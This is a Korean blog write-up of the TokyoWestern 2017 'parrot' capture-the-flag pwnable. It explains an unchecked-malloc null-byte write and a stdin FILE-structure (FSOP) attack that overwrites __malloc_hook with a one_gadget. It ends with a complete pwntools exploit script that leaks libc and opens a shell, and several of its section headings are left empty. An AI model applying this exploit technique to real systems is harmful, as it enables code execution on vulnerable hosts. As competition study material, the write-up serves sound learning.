---
title: TokyoWestern 2017 - parrot
categories:
 - pwnable
tags: tokyowestern, pwn, fsop, off_by_null
---

## Introduction

정말 우물 안 개구리라는 것을 느끼개 해준 문제이다. 최신동향 조금이나마 따라가고 있다고 생각했었는데 ㅋㅋㅋ 컷~ 2017년 문제부터 풀고와~ ㅋㅋㅋ

개인적으로 너무 답도 없다고 느껴서 WriteUp을 참고했다.

문제는 glibc-2.23으로 나왔지만 지금 환경상 glibc-2.19 밖에 쓰질 못하기 때문에 glibc-2.19로 문제를 풀었다.

## Vunlnerability


```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

```
main(0xa20)

	setvbuf(stdin, 0, 2, 0) call 0x8c0

	setvbuf(stdout, 0, 2, 0) call 0x8c0

	sleep(0x3) call 0x8d8

	while True:
		
		puts("Size:") call 0x888
		
		scanf("%lu", rbp-0x18) call 0x8c8
		
		getchar() call 0x8a8
		
		if [rbp-0x18] == 0:
			exit(0) call 0x8d0
		
		[rbp-0x10] = malloc([rbp-0x18]) call 0x8b8
		
		puts("Buffer:")
		
		read(0, [rbp-0x10], [rbp-0x18]) call 0x898
		
		[[rbp-0x18] + [rbp-0x10] - 1] = 0
		
		write(1, [rbp-0x10], [rbp-0x18]) call 0x890
		
		free([rbp-0x10]) call 0x880
```

parrot 바이너리의 `main`에서 `malloc`을 호출하고 에러검사를 하지않는다.

이때 `BYTE PTR [malloc_return_addr + size - 1] = 0`를 해주는데 여기서 `size`를 library 주소만큼 줘서 `malloc`에서 에러나게 해서` malloc_return_addr`는 0으로 세팅할 수 있게 된다.


## Exploit

exploit은 

1. glibc_leak (malloc_consolidate)
2. one_byte_null to _IO_buf_base
3. __underflow -> _IO_new_file_underflow -> _IO_switch_to_get_mode -> _IO_SYSREAD
4. stdin's member overwrite
5. _IO_read_ptr sync with _IO_read_end via getchar()
6. when _IO_read_ptr == _IO_read_ptr, recall __underflow
7. overwrite malloc_hook to onegadget by call _IO_SYSREAD

이 순서대로 진행된다.

exploit 환경은 glibc-2.23이 아닌 glibc-2.19임을 상기해주길 바란다.

### Glibc leak



### Off_by_null to _IO_buf_base
### Invoke __underflow
### Sync _IO_read_ptr with _IO_read_ptr by getchar()
### Invoke __underflow again
### Overwrite __malloc_hook


## slv.py

```python
from pwn import *

p = process('./tw2017parrot')
e = ELF('./tw2017parrot')
libc = e.libc

## glibc 2.19 ##

context.terminal = ['/goorm/tmux', 'splitw', '-h']
#context.log_level = 'debug'
script = '''
b* 0xb12
b* 0xaa2
dir /usr/src/glibc/eglibc-2.19/stdio-common
'''
one_gadget = [0x46428, 0x4647c, 0xe9415, 0xea36d]

sla = lambda s,r : p.sendlineafter(s, str(r))
sa =  lambda s,r : p.sendafter(s, str(r))
sl = lambda s : p.sendline(s)
s = lambda s : p.send(s)


def heap(size, buffer):
	
	sla('Size:\n', size)
	sla('Buffer:\n', buffer)
	
	return


def leak():
	
	heap(0x10, 'a')
	heap(0x70, 'a')
	heap(0x80, 'a') # malloc_consolidate in init_free
	heap(0x10, 'aaaaaab')

	return p.recvuntil('\x00')


def main():
	
	libc_base = u64(leak().split('\n')[1][:6].ljust(8, '\x00')) - 0x3c27b8
	log.info('libc_base : ' + hex(libc_base))
	
	_IO_buf_base = libc_base + libc.symbols['_IO_2_1_stdin_']
	binsh_addr = libc_base + 0x180543
	system_addr = libc_base + libc.symbols['system']
	malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
	free_hook_addr = libc_base + libc.symbols['__free_hook']
	one_gadget_addr = libc_base + one_gadget[2]
	
	gdb.attach(p, script)
	
	sla('Size:\n', _IO_buf_base+57)
	
	payload = ''
	payload += p64(0)*6
	payload += p64(_IO_buf_base - 0x22a0)
	payload += p64(0)
	payload += p64(0xfbad208b) # stdin _flags
	payload += p64(_IO_buf_base - 0x3c) # _IO_read_ptr
	payload += p64(_IO_buf_base - 0x3c) # _IO_read_end
	payload += p64(_IO_buf_base - 0x40) # _IO_read_base
	payload += p64(0) * 2 # _IO_write_base, _IO_write_ptr
	payload += p64(1) # _IO_write_end
	payload += p64(malloc_hook_addr-0x8) # _IO_buf_base -0x40
	payload += p64(malloc_hook_addr+0x8) # _IO_buf_end
	
	s(payload)
	
	sleep(0.1)
	
	for i in range(0x80):
		p.recvuntil('Size:\n')
		p.sendline('')
		sleep(0.1)
	
	payload = ''
	payload += p64(0)*8
	payload += p64(one_gadget_addr)
	
	sl(payload)
	
	p.interactive()
	
	return

if __name__ == '__main__':
	main()
```


## 느낀 점